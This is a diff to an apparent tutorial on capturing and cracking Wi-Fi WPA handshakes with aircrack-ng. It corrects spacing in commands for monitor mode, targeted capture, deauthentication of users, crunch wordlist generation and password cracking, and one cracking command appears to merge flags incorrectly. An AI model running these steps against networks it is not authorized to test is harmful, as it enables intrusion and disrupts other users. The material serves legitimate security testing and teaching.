@@ -36,7 +36,7 @@ Enable monitor mode on the desired network interface.
 
 ```sh
 
-airmon-ngstartwlan0
+airmon-ng start wlan0
 
 iwconfig
 
@@ -72,7 +72,7 @@ Scan for available networks.
 
 ```sh
 
-airodump-ngwlan0mon
+airodump-ng wlan0mon
 
 ```
 
@@ -126,7 +126,7 @@ Capture traffic on a specific channel and BSSID.
 
 ```sh
 
-airodump-ng-cCHANNEL_ID--bssidCHANNEL_BSSID-w/rootwlan0mon
+airodump-ng -c CHANNEL_ID --bssid CHANNEL_BSSID -w /root wlan0mon
 
 ```
 
@@ -136,7 +136,7 @@ Send deauthentication packets to a user on the network.
 
 ```sh
 
-aireplay-ng--deauthDEAUTH_COUNT-aCHANNEL_BSSIDwlan0mon
+aireplay-ng --deauth DEAUTH_COUNT -a CHANNEL_BSSID wlan0mon
 
 ```
 
@@ -144,13 +144,17 @@ aireplay-ng--deauthDEAUTH_COUNT-aCHANNEL_BSSIDwlan0mon
 
 The handshake is captured during the monitoring process. Ensure you have captured the handshake before proceeding to crack the password. The handshake file is typically saved with a `.cap` extension.
 
+**Example Output:**
+
+![HandShake](handshake.png)
+
 ### 7. Create a Wordlist
 
 If you do not have a wordlist, you can create one using tools like `crunch`.
 
 ```sh
 
-crunch88abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-owordlist.txt
+crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o wordlist.txt
 
 ```
 
@@ -162,7 +166,7 @@ After capturing the handshake, use a wordlist to crack the password.
 
 ```sh
 
-sudoaircrack-ng-a272:9A:0C:44:4A:82-wwordlist.txthandshake.cap
+sudo aircrack-ng -a 272:9A:0C:44:4A:82 -w wordlist.txt handshake.cap
 
 ```
 
